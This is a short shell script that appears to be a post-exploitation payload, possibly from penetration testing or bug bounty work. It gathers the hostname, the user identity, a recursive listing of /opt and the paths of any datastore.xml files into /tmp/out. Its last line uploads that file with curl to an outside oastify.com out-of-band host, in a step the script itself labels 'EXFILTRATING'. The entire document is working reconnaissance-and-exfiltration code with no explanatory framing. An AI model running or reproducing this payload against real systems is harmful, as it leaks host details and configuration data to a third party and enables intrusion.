#!/bin/sh
echo "--- HOSTNAME ---" > /tmp/out
hostname >> /tmp/out
echo "--- ID ---" >> /tmp/out
id >> /tmp/out
echo "--- LS /OPT ---" >> /tmp/out
ls -R /opt >> /tmp/out 2>&1
echo "--- DATASTORE FILES ---" >> /tmp/out
find /opt -name datastore.xml >> /tmp/out 2>&1
echo "--- EXFILTRATING ---" >> /tmp/out
curl -F f=@/tmp/out http://jm9610q5mvh5pgcpsql4q2lf56bxz3hkln3c.oastify.com/final
